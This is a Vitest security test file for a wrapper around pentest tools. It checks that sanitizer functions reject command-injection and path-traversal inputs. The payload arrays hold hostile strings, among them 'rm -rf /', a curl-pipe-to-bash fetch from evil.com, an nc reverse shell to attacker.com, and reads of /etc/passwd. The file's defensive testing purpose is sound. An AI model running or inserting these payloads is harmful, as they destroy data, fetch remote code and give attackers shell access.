import { describe, it, expect } from 'vitest';
import { sanitizeArgs } from '../../src/utils/command.js';
import { sanitizeInput, isTargetAllowed } from '../../src/utils/security.js';
import { isSafeArgument } from '../../src/validators/safety.js';
import { NmapTool } from '../../src/tools/nmap.js';
import { NucleiTool } from '../../src/tools/nuclei.js';
import { DirsearchTool } from '../../src/tools/dirsearch.js';
import { SqlmapTool } from '../../src/tools/sqlmap.js';
import { HydraTool } from '../../src/tools/hydra.js';

const injectionPayloads = [
  '; rm -rf /',
  '| cat /etc/passwd',
  '`whoami`',
  '$(curl http://evil.com/shell.sh | bash)',
  '& nc -e /bin/sh attacker.com 4444',
];

const tools = [
  { name: 'nmap', instance: new NmapTool() },
  { name: 'nuclei', instance: new NucleiTool() },
  { name: 'dirsearch', instance: new DirsearchTool() },
  { name: 'sqlmap', instance: new SqlmapTool() },
  { name: 'hydra', instance: new HydraTool() },
];

describe('Injection Prevention Security Tests', () => {
  describe('sanitizeArgs blocks all injection payloads', () => {
    for (const payload of injectionPayloads) {
      it(`blocks: ${payload.substring(0, 30)}`, () => {
        expect(sanitizeArgs([payload])).toBe(false);
      });
    }
  });

  describe('isSafeArgument blocks all injection payloads', () => {
    for (const payload of injectionPayloads) {
      it(`blocks: ${payload.substring(0, 30)}`, () => {
        expect(isSafeArgument(payload)).toBe(false);
      });
    }
  });

  describe('sanitizeInput blocks all injection payloads', () => {
    for (const payload of injectionPayloads) {
      it(`blocks: ${payload.substring(0, 30)}`, () => {
        expect(sanitizeInput(payload)).toBe(false);
      });
    }
  });

  describe('Tool buildArgs output passes sanitizeArgs for clean inputs', () => {
    for (const { name, instance } of tools) {
      it(`${name} produces safe args for basic scan`, () => {
        const params = { targets: '8.8.8.8' };
        const validation = instance.validateParams(params);
        if (validation.valid) {
          const args = instance.buildArgs(params);
          expect(sanitizeArgs(args)).toBe(true);
        }
      });
    }
  });

  describe('Path traversal prevention', () => {
    const traversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32',
    ];

    for (const payload of traversalPayloads) {
      it(`blocks path traversal: ${payload}`, () => {
        expect(isSafeArgument(payload)).toBe(false);
      });
    }
  });
});
